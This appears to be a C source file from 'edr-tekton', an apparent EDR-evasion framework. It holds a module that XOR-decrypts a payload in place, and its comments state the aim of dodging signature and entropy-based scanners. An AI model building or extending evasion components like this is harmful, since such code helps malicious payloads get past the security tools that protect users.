/*
 * edr-tekton :: XOR Encryption Module
 * Cat 3.1: Multi-byte XOR encryption/decryption
 *
 * Wraps TektonCryptoXor into the module vtable pattern.
 * Supports static key from config or environment-derived key.
 *
 * XOR is fast with a small footprint, fully reversible.
 * Best used as an inner layer combined with stronger ciphers,
 * or standalone when signature evasion is the only goal
 * (entropy stays low with short keys, which can be a plus
 * for avoiding heuristic scanners that flag high-entropy blobs).
 */

#include "tekton/modules/encrypt.h"
#include "tekton/util/crypto.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _XOR_MODULE_STATE {
    TEKTON_KEY_SOURCE   key_source;
    BYTE                key[32];
    SIZE_T              key_len;
    BOOL                initialized;
} XOR_MODULE_STATE;

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS xor_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    XOR_MODULE_STATE* state = (XOR_MODULE_STATE*)malloc(sizeof(XOR_MODULE_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));
    state->key_source = TEKTON_KEY_STATIC;

    /* Default key, overridden by config */
    static const BYTE default_key[] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x13, 0x37, 0x42, 0x69, 0xAA, 0xBB, 0xCC, 0xDD
    };
    memcpy(state->key, default_key, sizeof(default_key));
    state->key_len = sizeof(default_key);

    self->private_data = state;

    TLOG_DEBUG("encrypt_xor: init (key_source=static, key_len=%lu)",
        (unsigned long)state->key_len);
    return TEKTON_OK;
}

static TEKTON_STATUS xor_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    XOR_MODULE_STATE* state = (XOR_MODULE_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("encrypt_xor: [DRY RUN] would XOR decrypt payload (%lu bytes, key_len=%lu)",
            (unsigned long)ctx->payload.length, (unsigned long)state->key_len);
        return TEKTON_OK;
    }

    /* Resolve key if environment-derived */
    if (state->key_source == TEKTON_KEY_ENV && !state->initialized) {
        TEKTON_STATUS ks = TektonCryptoDeriveEnvKey(state->key, 16, NULL);
        if (ks != TEKTON_OK) {
            TLOG_ERROR("encrypt_xor: env key derivation failed");
            return ks;
        }
        state->key_len = 16;
        state->initialized = TRUE;
        TLOG_DEBUG("encrypt_xor: env key derived");
    }

    /* Validate payload */
    if (!ctx->payload.data || ctx->payload.length == 0) {
        TLOG_ERROR("encrypt_xor: no payload to decrypt");
        return TEKTON_ERR_INVALID_PARAM;
    }

    /* Allocate decrypted buffer if not already set */
    if (!ctx->decrypted.data) {
        ctx->decrypted.data = (BYTE*)malloc(ctx->payload.length);
        if (!ctx->decrypted.data) return TEKTON_ERR_ALLOC;
        memcpy(ctx->decrypted.data, ctx->payload.data, ctx->payload.length);
        ctx->decrypted.length = ctx->payload.length;
        ctx->decrypted.capacity = ctx->payload.length;
    }

    /* XOR decrypt in place */
    TektonCryptoXor(ctx->decrypted.data, ctx->decrypted.length,
                    state->key, state->key_len);

    state->initialized = TRUE;

    TLOG_INFO("encrypt_xor: decrypted %lu bytes",
        (unsigned long)ctx->decrypted.length);
    return TEKTON_OK;
}

static VOID xor_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(XOR_MODULE_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD xor_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /* Very low: XOR is common, not suspicious on its own */
    return 5;
}

static BOOL xor_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    /* XOR works everywhere */
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_encrypt_xor = {
    .name           = "encrypt_xor",
    .description    = "XOR encryption/decryption (Cat 3.1)",
    .category       = TEKTON_CAT_ENCRYPT,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = 0,
    .skill_ref      = "3.1",
    .init           = xor_init,
    .execute        = xor_execute,
    .cleanup        = xor_cleanup,
    .get_risk_score = xor_risk_score,
    .check_compat   = xor_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_encrypt_xor);
